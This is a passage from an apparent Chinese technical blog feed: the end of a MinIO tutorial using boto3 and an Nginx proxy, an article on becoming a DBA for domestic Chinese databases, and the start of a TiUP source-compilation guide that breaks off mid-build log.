<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ mc du minio/</span><br><span class="line">391KiB  15 objects      minio</span><br><span class="line">[shawnyan@centos7 ~]$ mc du minio/data/s3-yan</span><br><span class="line">370KiB  2 objects       minio/data/s3-yan</span><br></pre></td></tr></table></figure></div>
<h2 id="使用-boto3-客户端连接-MinIO">使用 boto3 客户端连接 MinIO</h2>
<h3 id="安装-boto3">安装 boto3</h3>
<p>使用 pip 在本地安装 boto3。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 s3-yan]$ pip3 install boto3 --user</span><br><span class="line">Looking in indexes: https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">Collecting boto3</span><br><span class="line">  Downloading https://mirrors.aliyun.com/pypi/packages/75/ca/d917b244919f1ebf96f7bbd5a00e4641f7e9191b0d070258f5dc10f5eaad/boto3-1.23.10-py3-none-any.whl (132 kB)</span><br><span class="line">     |████████████████████████████████| 132 kB 600 kB/s</span><br><span class="line">Collecting botocore&lt;1.27.0,&gt;=1.26.10</span><br><span class="line">  Downloading https://mirrors.aliyun.com/pypi/packages/09/b8/794e0bd260198538ded90c26b353ddb632eab01950d4e7e2e2b8ee510d12/botocore-1.26.10-py3-none-any.whl (8.8 MB)</span><br><span class="line">     |████████████████████████████████| 8.8 MB 592 kB/s</span><br><span class="line">Collecting jmespath&lt;2.0.0,&gt;=0.7.1</span><br><span class="line">  Downloading https://mirrors.aliyun.com/pypi/packages/07/cb/5f001272b6faeb23c1c9e0acc04d48eaaf5c862c17709d20e3469c6e0139/jmespath-0.10.0-py2.py3-none-any.whl (24 kB)</span><br><span class="line">Collecting s3transfer&lt;0.6.0,&gt;=0.5.0</span><br><span class="line">  Downloading https://mirrors.aliyun.com/pypi/packages/7b/9c/f51775ebe7df5a7aa4e7c79ed671bde94e154bd968aca8d65bb24aba0c8c/s3transfer-0.5.2-py3-none-any.whl (79 kB)</span><br><span class="line">     |████████████████████████████████| 79 kB 742 kB/s</span><br><span class="line">Requirement already satisfied: urllib3&lt;1.27,&gt;=1.25.4 in /home/shawnyan/.local/lib/python3.6/site-packages (from botocore&lt;1.27.0,&gt;=1.26.10-&gt;boto3) (1.26.6)</span><br><span class="line">Requirement already satisfied: python-dateutil&lt;3.0.0,&gt;=2.1 in /home/shawnyan/.local/lib/python3.6/site-packages (from botocore&lt;1.27.0,&gt;=1.26.10-&gt;boto3) (2.8.2)</span><br><span class="line">Requirement already satisfied: six&gt;=1.5 in /home/shawnyan/.local/lib/python3.6/site-packages (from python-dateutil&lt;3.0.0,&gt;=2.1-&gt;botocore&lt;1.27.0,&gt;=1.26.10-&gt;boto3) (1.16.0)</span><br><span class="line">Installing collected packages: jmespath, botocore, s3transfer, boto3</span><br><span class="line">Successfully installed boto3-1.23.10 botocore-1.26.10 jmespath-0.10.0 s3transfer-0.5.2</span><br></pre></td></tr></table></figure></div>
<h3 id="配置-boto3-客户端">配置 boto3 客户端</h3>
<p>进入 python 交互界面，配置 boto3 连接 MinIO。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import boto3</span><br><span class="line"></span><br><span class="line">s3 = boto3.client(&#x27;s3&#x27;, endpoint_url=&#x27;http://localhost:9000&#x27;, aws_access_key_id=&#x27;minioadmin&#x27;, aws_secret_access_key=&#x27;minioadmin&#x27;)</span><br></pre></td></tr></table></figure></div>
<h3 id="创建存储桶">创建存储桶</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; s3.create_bucket(Bucket=&#x27;mybucket&#x27;)</span><br><span class="line">&#123;&#x27;ResponseMetadata&#x27;: &#123;&#x27;RequestId&#x27;: &#x27;177956EC4443419A&#x27;, &#x27;HostId&#x27;: &#x27;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&#x27;, &#x27;HTTPStatusCode&#x27;: 200, &#x27;HTTPHeaders&#x27;: &#123;&#x27;accept-ranges&#x27;: &#x27;bytes&#x27;, &#x27;content-length&#x27;: &#x27;0&#x27;, &#x27;location&#x27;: &#x27;/mybucket&#x27;, &#x27;server&#x27;: &#x27;MinIO&#x27;, &#x27;strict-transport-security&#x27;: &#x27;max-age=31536000; includeSubDomains&#x27;, &#x27;vary&#x27;: &#x27;Origin, Accept-Encoding&#x27;, &#x27;x-amz-id-2&#x27;: &#x27;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&#x27;, &#x27;x-amz-request-id&#x27;: &#x27;177956EC4443419A&#x27;, &#x27;x-content-type-options&#x27;: &#x27;nosniff&#x27;, &#x27;x-xss-protection&#x27;: &#x27;1; mode=block&#x27;, &#x27;date&#x27;: &#x27;Tue, 08 Aug 2023 07:11:47 GMT&#x27;&#125;, &#x27;RetryAttempts&#x27;: 0&#125;, &#x27;Location&#x27;: &#x27;/mybucket&#x27;&#125;</span><br></pre></td></tr></table></figure></div>
<p>创建成功后，在管理界面也可以看到。</p>
<img  alt="minio3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230809-839afd99-8772-4a6f-aa02-f0b42e379202.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="查看存储桶">查看存储桶</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; s3.list_buckets()</span><br><span class="line">&#123;&#x27;ResponseMetadata&#x27;: &#123;&#x27;RequestId&#x27;: &#x27;1779575EA007A195&#x27;, &#x27;HostId&#x27;: &#x27;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&#x27;, &#x27;HTTPStatusCode&#x27;: 200, &#x27;HTTPHeaders&#x27;: &#123;&#x27;accept-ranges&#x27;: &#x27;bytes&#x27;, &#x27;content-length&#x27;: &#x27;455&#x27;, &#x27;content-type&#x27;: &#x27;application/xml&#x27;, &#x27;server&#x27;: &#x27;MinIO&#x27;, &#x27;strict-transport-security&#x27;: &#x27;max-age=31536000; includeSubDomains&#x27;, &#x27;vary&#x27;: &#x27;Origin, Accept-Encoding&#x27;, &#x27;x-amz-id-2&#x27;: &#x27;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&#x27;, &#x27;x-amz-request-id&#x27;: &#x27;1779575EA007A195&#x27;, &#x27;x-content-type-options&#x27;: &#x27;nosniff&#x27;, &#x27;x-xss-protection&#x27;: &#x27;1; mode=block&#x27;, &#x27;date&#x27;: &#x27;Tue, 08 Aug 2023 07:19:58 GMT&#x27;&#125;, &#x27;RetryAttempts&#x27;: 0&#125;, &#x27;Buckets&#x27;: [&#123;&#x27;Name&#x27;: &#x27;mybucket&#x27;, &#x27;CreationDate&#x27;: datetime.datetime(2023, 8, 8, 7, 11, 47, 812000, tzinfo=tzutc())&#125;, &#123;&#x27;Name&#x27;: &#x27;s3-yan&#x27;, &#x27;CreationDate&#x27;: datetime.datetime(2023, 8, 8, 6, 11, 16, 570000, tzinfo=tzutc())&#125;], &#x27;Owner&#x27;: &#123;&#x27;DisplayName&#x27;: &#x27;minio&#x27;, &#x27;ID&#x27;: &#x27;02d6176db174dc93cb1b899f7c6078f08654445fe8cf1b6ce98d8855f66bdbf4&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="上传对象">上传对象</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; s3.put_object(Body=open(&#x27;file.txt&#x27;, &#x27;rb&#x27;), Bucket=&#x27;mybucket&#x27;, Key=&#x27;myfile&#x27;)</span><br><span class="line">&#123;&#x27;ResponseMetadata&#x27;: &#123;&#x27;RequestId&#x27;: &#x27;1779578881028A1E&#x27;, &#x27;HostId&#x27;: &#x27;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&#x27;, &#x27;HTTPStatusCode&#x27;: 200, &#x27;HTTPHeaders&#x27;: &#123;&#x27;accept-ranges&#x27;: &#x27;bytes&#x27;, &#x27;content-length&#x27;: &#x27;0&#x27;, &#x27;etag&#x27;: &#x27;&quot;a5791e2a3043c189b59c23eea51b3e03&quot;&#x27;, &#x27;server&#x27;: &#x27;MinIO&#x27;, &#x27;strict-transport-security&#x27;: &#x27;max-age=31536000; includeSubDomains&#x27;, &#x27;vary&#x27;: &#x27;Origin, Accept-Encoding&#x27;, &#x27;x-amz-id-2&#x27;: &#x27;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&#x27;, &#x27;x-amz-request-id&#x27;: &#x27;1779578881028A1E&#x27;, &#x27;x-content-type-options&#x27;: &#x27;nosniff&#x27;, &#x27;x-xss-protection&#x27;: &#x27;1; mode=block&#x27;, &#x27;date&#x27;: &#x27;Tue, 08 Aug 2023 07:22:58 GMT&#x27;&#125;, &#x27;RetryAttempts&#x27;: 0&#125;, &#x27;ETag&#x27;: &#x27;&quot;a5791e2a3043c189b59c23eea51b3e03&quot;&#x27;&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="查看对象">查看对象</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; s3.list_objects(Bucket=&#x27;mybucket&#x27;)</span><br><span class="line">&#123;&#x27;ResponseMetadata&#x27;: &#123;&#x27;RequestId&#x27;: &#x27;1779579C2F255CF3&#x27;, &#x27;HostId&#x27;: &#x27;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&#x27;, &#x27;HTTPStatusCode&#x27;: 200, &#x27;HTTPHeaders&#x27;: &#123;&#x27;accept-ranges&#x27;: &#x27;bytes&#x27;, &#x27;content-length&#x27;: &#x27;583&#x27;, &#x27;content-type&#x27;: &#x27;application/xml&#x27;, &#x27;server&#x27;: &#x27;MinIO&#x27;, &#x27;strict-transport-security&#x27;: &#x27;max-age=31536000; includeSubDomains&#x27;, &#x27;vary&#x27;: &#x27;Origin, Accept-Encoding&#x27;, &#x27;x-amz-id-2&#x27;: &#x27;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&#x27;, &#x27;x-amz-request-id&#x27;: &#x27;1779579C2F255CF3&#x27;, &#x27;x-content-type-options&#x27;: &#x27;nosniff&#x27;, &#x27;x-xss-protection&#x27;: &#x27;1; mode=block&#x27;, &#x27;date&#x27;: &#x27;Tue, 08 Aug 2023 07:24:23 GMT&#x27;&#125;, &#x27;RetryAttempts&#x27;: 0&#125;, &#x27;IsTruncated&#x27;: False, &#x27;Marker&#x27;: &#x27;&#x27;, &#x27;Contents&#x27;: [&#123;&#x27;Key&#x27;: &#x27;myfile&#x27;, &#x27;LastModified&#x27;: datetime.datetime(2023, 8, 8, 7, 22, 58, 846000, tzinfo=tzutc()), &#x27;ETag&#x27;: &#x27;&quot;a5791e2a3043c189b59c23eea51b3e03&quot;&#x27;, &#x27;Size&#x27;: 4, &#x27;StorageClass&#x27;: &#x27;STANDARD&#x27;, &#x27;Owner&#x27;: &#123;&#x27;DisplayName&#x27;: &#x27;minio&#x27;, &#x27;ID&#x27;: &#x27;02d6176db174dc93cb1b899f7c6078f08654445fe8cf1b6ce98d8855f66bdbf4&#x27;&#125;&#125;], &#x27;Name&#x27;: &#x27;mybucket&#x27;, &#x27;Prefix&#x27;: &#x27;&#x27;, &#x27;MaxKeys&#x27;: 1000, &#x27;EncodingType&#x27;: &#x27;url&#x27;&#125;</span><br></pre></td></tr></table></figure></div>
<p>也可在管理界面查看刚刚上传的对象。</p>
<img  alt="minio4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230809-1ee360ec-f97c-4a50-b549-462ccfd3f103.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="下载对象">下载对象</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; s3.download_file(&#x27;mybucket&#x27;, &#x27;myfile&#x27;, &#x27;myfile.txt&#x27;)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ cat myfile.txt</span><br><span class="line">yan</span><br></pre></td></tr></table></figure></div>
<h2 id="基于-Nginx-对外提供服务">基于 Nginx 对外提供服务</h2>
<p>Nginx 是一个高性能的 HTTP 和反向代理 web 服务器，这里可以使用 Nginx 将 MinIO 转发出去，以供其他用户访问。</p>
<p>nginx 增加配置，监听 80 端口，转发到 MinIO 所在服务器的 9000 端口上。</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">server</span> &#123;</span><br><span class="line">    <span class="string">listen</span> <span class="number">80</span><span class="string">;</span></span><br><span class="line">    <span class="string">server_name</span> <span class="string">xxx;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">location</span> <span class="string">/</span> &#123;</span><br><span class="line">        <span class="string">proxy_pass</span> <span class="string">http://xxx:9000;</span></span><br><span class="line">        <span class="string">proxy_set_header</span> <span class="string">Host</span> <span class="string">$host:$server_port;</span></span><br><span class="line">        <span class="string">proxy_set_header</span>   <span class="string">X-Real-IP</span>   <span class="string">$remote_addr;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>分别测试直接访问 MinIO 对象，及通过 Nginx 访问，均可用。</p>
<p><a class="link"   href="http://192.168.195.128:9000/s3-yan/rawkv-cdc-arch-simple.png" >http://192.168.195.128:9000/s3-yan/rawkv-cdc-arch-simple.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="minio5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230809-917438ce-6b81-4d01-9ea2-1267a003a211.png"
                      referrerpolicy="no-referrer"
                >
<p><a class="link"   href="http://xxx/s3-yan/rawkv-cdc-arch-simple.png" >http://xxx/s3-yan/rawkv-cdc-arch-simple.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="minio6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230809-1f7fa720-0710-4a5c-a5b1-6d93fe036ffb.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="总结">总结</h2>
<p>以上示例展示了如何安装 MinIO，并对其进行简单的对象存储操作。接下来将基于此分享更多尝试。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1689077981174652928" >https://www.modb.pro/db/1689077981174652928 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>MinIO</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>minio</tag>
        <tag>存储</tag>
        <tag>s3</tag>
        <tag>boto3</tag>
      </tags>
  </entry>
  <entry>
    <title>如何成为一名国产数据库 DBA ?</title>
    <url>/2023/modb/modb-how-to-be-a-good-dba/</url>
    <content><![CDATA[<p>在美国的围追堵截之下，中国自主可控国产化是发展的必由之路。根据墨天轮2023年8月中国数据库排行榜最新数据，286个中国数据库正在行业内崛起。在面对 AI 的强势来袭、企业内部的自然召唤，传统 DBA 也开始踏入向国产数据库 DBA的转型之路，其他技术群体也有部分人员有学习国产数据库的意向。为什么转型国产数据库DBA？如何转型呢？</p>
<h2 id="一、投身国产数据库是发展趋势">一、投身国产数据库是发展趋势</h2>
<p>自俄乌事件爆发后，中国基础软件国产化迈入加速期。中国数据库行业相关的政策不断增多，并直指基础软件领域。2023年2月，中共中央政治局第三次集体学习中，习近平总书记指出：要打好科技仪器设备、操作系统和基础软件国产化攻坚战，鼓励科研机构、高校同企业开展联合攻关，提升国产化替代水平和应用规模，争取早日实现用我国自主的研究平台、仪器设备来解决重大基础研究问题。在国家、数据库厂商以及从业者的齐心协力下，中国数据库市场迎来了质的飞跃。</p>
<p>根据中国通信标准化协会大数据技术标准推进委员会（CCSA TC601） 测算，2022 年全球数据库市场规模为 833 亿美元，中国数据库市场规模为 59.7 亿美元（约合 403.6 亿元人民币）占全球 7.2%1。预计到 2027 年，中国数据库市场总规模将达到 1286.8亿元，市场年复合增长率（CAGR）为 26.1%。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/modb/modb-how-to-be-a-good-dba/20230807-dba-1.png"
                      alt="" loading="lazy"
                ></p>
<p>图：2022-2027 年中国数据库市场规模及增速</p>
<p>随着数据库国产化趋势的来临，国产数据库 DBA 行业前景较好，主要由以下几个因素的推动：</p>
<p>1、政策推动，国产化替代是必然趋势。 虽然 Oracle 在中国仍有一定的市场，但随着国产化替代加速迈进，Oracle 数据库在中国所占的市场份额将会逐步削减，国产数据库将会填补大部分的市场空白。</p>
<p>2、中国数据库市场规模逐年增长。 存量市场方面，国产数据库将会从边缘系统到核心系统的国产化。未来逐步向金融、电信、能源等行业渗透。增量市场方面，随着数字产业化需求的提升，数据库作为基础软件，将迎来广阔的增量市场</p>
<p>3、国产数据库厂商层出不穷，各细分领域逐渐完善。 图数据、时序数据库、向量数据库风口已至，国产数据库DBA的选择也越来越多。</p>
<h2 id="二、国产数据库-DBA-和传统-DBA-的区别">二、国产数据库 DBA 和传统 DBA 的区别</h2>
<p>从技术方面来说，国产数据库 DBA 和传统数据库 DBA 的最大的区别就是在很长一段时间内，某个垂直领域内的传统 DBA 只需要学习某款数据库就可以了，在这个领域内，大部分市场份额都只是这一款数据库，俗称“一招鲜，走天下”。而对于当下的国产数据库DBA，则学习节奏明显加快，不再局限于某款数据库，而是需要有能力同时学习多种关系型数据库，以及更多其他类型的数据库，如键值类型数据库、图数据库，甚至可以预见的是还将要学习向量数据库等等。这还仅仅是数据库本身的内容，对于数据库产品的周边生态，如监控工具，迁移工具，备份升级等，也是需要熟悉的。</p>
<p>在学习渠道方面，由于当前国产数据库的文档种类太少、资料不全、对外内容仅停留在概念层面，导致数据库相关从业者获取知识的渠道不畅通、学习的内容不系统。此外，某些数据库下载测试的条件很苛刻，只限定客户，这一个“拦路虎”就让大部分想要学习国产数据库的从业者望而却步。</p>
<p>在原厂服务方面，国产数据库对从业者而言就像一个黑匣子，当数据库出现问题时，数据库从业者从原厂获得的指南和建议相对不成熟，对国产数据库 DBA 的运维也是一个极大的挑战。</p>
<h2 id="三、如何转型国产数据库-DBA">三、如何转型国产数据库 DBA</h2>
<p>技术知识的储备是转型的基础，虽然国产数据库 DBA 的转型之路比较艰难，但是在这种挑战中也蕴含着巨大的机遇。国产数据库 DBA 的转型方式有很多，针对不同类别的人群有不同的方式：</p>
<p>1、精通 MySQL、PostgreSQL、Oracle 等数据库的从业者。这一类的群体由于有良好的数据库知识的储备，且目前大多数国产数据库都基于MySQL、PG等开源数据库做二次开发的产品。或者数据库本身是自研产品，但是做了 MySQL，PostgreSQL，Oracle的兼容性，所以在一定程度上可以保持原有习惯，快速学习入门新的国产数据库。这部分群体可以通过数据库厂商的培训认证、线上直播、生态社区中的博客等途径，快速掌握特定技能。</p>
<p>2、其他技术从业者或对数据库感兴趣的人群。首先需要掌握至少一到两种开发语言，能对产品做更适合数据库业务系统的开发指导和支持；储备软、硬件技能，如服务器、存储、操作系统等，能够在遇到关键问题时快速排查问题并解决；了解数据库的基本架构、服务器的安装、配置与运维等。 在具备基础的技能后，才能更快迈入国产数据库DBA 的队伍。</p>
<p>墨天轮作为一个数据社区，拥有丰富的国产数据库资料。平台内有免费的国产数据库课程以及相关的培训认证。此外，多家国产数据库厂商入驻墨天轮社区，持续进行直播分享、问题解答等，共建国产数据库的生态。近日，墨天轮社区内有一位用户——严少安，分享了<a href="https://shawnyan.cn/2023/database-book-list/">国产数据库的书单</a>。有意向转型国产数据库 DBA 的朋友可以仔细研读此书单中的书籍。</p>
<h2 id="四、以考促学，成功拿下PE认证全家桶">四、以考促学，成功拿下PE认证全家桶</h2>
<p>“以我个人的从业经历来说，在此之前的多年时间里都是一名纯粹的传统 DBA，长期专注于 MySQL 数据库，从 MySQL 5.5到 5.6/5.7 再到如今的 MySQL 8.1，及其分支版本 MariaDB 5.5到10.0~10.6再到如今的 MariaDB 11，” 严少安说道。经历多年的学习实践和经验积累，从最开始的&quot;ctrl+c/v&quot; DBA，严少安逐步成长为&quot;baidu/google&quot; DBA，再到如今能通过源码定位问题的 DBA。</p>
<p>作为一线工作 DBA，他深感身上担子之重，心中也一直保持敬畏之心，同时不断学习，持续输出，精进成长。去“O”话题已经延续很多年，但具体用什么国产数据库，以什么路径学习国产数据库，如何高效率掌握国产数据库技能，则是一个相生相伴的话题。</p>
<p>2019年下半年，他的关注度从 DB-Engine 开始转向国产数据库排行榜，从而开始了国产数据库的学习之旅，这次“旅程”的体验感完全不同，因为排行榜上有200+产品可以选择，如何找到一个好的切入点来开启这段旅程，他的选择很简单，从榜首开始研究。巧合的是，当时国产数据库位列榜单第一的是 PingCAP 的 TiDB，而他们团队在此之前已经开始接触研究 TiDB，当时还是 v2 版本。他个人习惯的学习路径基本是先找官方文档，快速浏览全部的文档，或者直接购买相关书籍（或者前往墨天轮墨值商城兑换）。因为图书是经过严格审校才会出版的，至少可以保证内容的正确性，如此，就对该产品有个大体的印象，初步搭建“记忆宫殿”。</p>
<p>其次，直接上手体验数据库，遇到问题再查文档、使用搜索引擎、使用墨天轮的搜索、去论坛提问、翻源码等等，循环往复，便对一款新数据库有全新的认识。值得一提的是，有些数据库厂商已经投入部分精力到培训认证方面，这里以TiDB为例，他们创建了PingCAP Education（简称PE），并发布了一系列课程，从体系介绍到性能优化，从入门实践到故障分析，对TiDB感兴趣或是需要进阶技能的同学都可以在PE网站上系统学习，PE提供的课程以视频教学为主、辅助以实验和习题，并可通过认证考试来检验学习成果。在过去的两年里，严少安也已经成功拿到了PE认证全家桶。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/modb/modb-how-to-be-a-good-dba/20230807-dba-2.png"
                      alt="" loading="lazy"
                ></p>
<p>图：严少安获得的PE认证全家桶</p>
<p>再以GBase为例，南大通用培训中心已经推出三款主打产品的相关培训课程及GDCA认证，在他看来GBase的培训课程对于刚入行的DBA或者在校大学生非常之友好，无论是否用到GBase数据库都值得来学习，每期认证培训为期一个月，线上视频课+微信答疑群的模式，学员有足够的时间来消化课程内容，遇到疑难问题也可以及时得到帮助。</p>
<p>他本人在墨天轮学习板块的学习时长超过了300小时，并获得了【学习标兵Lv5】勋章。实际上，严少安的学习之路也不是一帆风顺的。比如分布式架构的数据库，批量部署时没有准确的文档就很难做到“一键安装”、“开箱即用”；再如，国产数据库迭代更新很快，引入了很多新概念、新特性、新算法，公布的论文数量也日益增多，选项多了，容易出现选择困难症。他个人的经验是广泛汲取，建立自己的知识库。 他认为转型国产数据库DBA必须坚持“以考促学”的正确路线，需要多输出也要保持勤奋。</p>
<p>转型国产数据库 DBA 的道路“道阻且长”，但前进之路必有荣光。大家在学习国产数据库的过程中有哪些疑难问题呢？可以发表在本文评论区。</p>
<blockquote>
<p>本文由墨天轮社区与严少安共建而成，后续墨天轮将与社区用户共同创作更多内容。</p>
</blockquote>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1688384690087092224" >https://www.modb.pro/db/1688384690087092224 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzU0NTk1MTc2Ng==&amp;mid=2247491070&amp;idx=1&amp;sn=d15d3e510816c2989c318258a31b8635" >2023-08-29, 如何成为一名国产数据库DBA? (共建) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>墨天轮</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>pingcap认证</tag>
        <tag>modb</tag>
        <tag>dba</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 7.x 源码编译之 TiUP 篇，及新特性解析</title>
    <url>/2023/tidb/tidb-7.x-compile-tiup/</url>
    <content><![CDATA[<img  alt="tidb-7.x-new-feature-banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/tidb-7.x-new-feature-banner-1696249336706.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="引言">引言</h2>
<p>前文 <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-pd/">TiDB 源码编译之 PD/TiDB Dashboard 篇</a> 演示了如何编译 PD 和 TiDB Dashboard 组件，本文继续谈谈 TiUP，对于 TiUP 组件的重要意义也已经在去年的文章 <a href="https://shawnyan.cn/2022/tidb/tiup-intro/#tiup-mirror">TiUP：TiDBAer 必备利器</a> 中充分阐述，不再赘述，直接上干货。</p>
<h2 id="TiUP-编译">TiUP 编译</h2>
<h3 id="源码仓库">源码仓库</h3>
<p>TiUP 的源码在 PingCAP 的 org 下，</p>
<p>目标地址为： <a class="link"   href="https://github.com/pingcap/tiup/" >https://github.com/pingcap/tiup/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>需要注意的是，去年十月，bench 压测组件的源码独立成单独仓库 (<a class="link"   href="https://github.com/pingcap/tiup/pull/2055" >#2055 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)，</p>
<p>目标地址变更为： <a class="link"   href="https://github.com/PingCAP-QE/tiup-bench" >https://github.com/PingCAP-QE/tiup-bench <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="编译执行">编译执行</h3>
<p>TiUP 主要语言也是 Go，所以编译依赖于前文相似，但注意到 TiUP 仍旧使用的 1.18， 所以这里提了个 Issue (<a class="link"   href="https://github.com/pingcap/tiup/issues/2239" > Upgrade golang version to 1.20 #2239  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)记录一下。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/shawn0915/tiup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行编译</span></span><br><span class="line"><span class="built_in">cd</span> tiup</span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>
<p>编译很丝滑，中间有提示 25 个 WARN，但不影响编译进程。只要网络没问题（由于某些资源依赖在 GitHub 上，所以需要靠谱的梯子）就可以顺利编译。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan tiup]# make</span><br><span class="line">gofmt (simplify)</span><br><span class="line">goimports (if installed)</span><br><span class="line">linting</span><br><span class="line">  ⚠  https://revive.run/r#cognitive-complexity  function newImportCmd has cognitive complexity 51 (&gt; max enabled 48)  </span><br><span class="line">  ./components/cluster/command/import.go:31:1</span><br><span class="line"></span><br><span class="line">  ⚠  https://revive.run/r#cognitive-complexity  function (*Manager).Deploy has cognitive complexity 66 (&gt; max enabled 48)  </span><br><span class="line">  ./pkg/cluster/manager/deploy.go:57:1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">⚠ 25 problems (0 errors, 25 warnings)</span><br><span class="line"></span><br><span class="line">Warnings:</span><br><span class="line">  25  cognitive-complexity  </span><br><span class="line"></span><br><span class="line">go mod tidy</span><br><span class="line">./tools/check/check-tidy.sh</span><br><span class="line">GO111MODULE=on CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go vet ./...</span><br><span class="line">make -C components/client </span><br><span class="line">make[1]: Entering directory `/root/tiup/components/client&#x27;</span><br><span class="line">gofmt (simplify)</span><br><span class="line">goimports (if installed)</span><br><span class="line">linting</span><br><span class="line">go mod tidy</span><br><span class="line">../../tools/check/check-tidy.sh</span><br><span class="line">go: downloading github.com/spf13/cobra v1.3.0</span><br><span class="line">go: downloading github.com/xo/usql v0.9.5</span><br><span class="line">...</span><br><span class="line">go: downloading github.com/go-sql-driver/mysql v1.6.0</span><br><span class="line">...</span><br><span class="line">GO111MODULE=on CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go vet ./...</span><br><span class="line">GO111MODULE=on CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build  -ldflags &#x27;-w -s -X &quot;github.com/pingcap/tiup/pkg/version.GitHash=041760d-dirty&quot; -X &quot;github.com/pingcap/tiup/pkg/version.GitRef=pr-shawnyan-0806&quot; &#x27; -o ../../bin/tiup-client .</span><br><span class="line">make[1]: Leaving directory `/root/tiup/components/client&#x27;</span><br><span class="line">GO111MODULE=on CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build  -ldflags &#x27;-w -s -X &quot;github.com/pingcap/tiup/pkg/version.GitHash=041760d-dirty&quot; -X &quot;github.com/pingcap/tiup/pkg/version.GitRef=pr-shawnyan-0806&quot; &#x27; -o bin/tiup-cluster ./components/cluster</span><br><span class="line">GO111MODULE=on CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build  -ldflags &#x27;-w -s -X &quot;github.com/pingcap/tiup/pkg/version.GitHash=041760d-dirty&quot; -X &quot;github.com/pingcap/tiup/pkg/version.GitRef=pr-shawnyan-0806&quot; &#x27; -o bin/tiup-dm ./components/dm</span><br><span class="line">GO111MODULE=on CGO_ENABLED=0 GOOS=linux 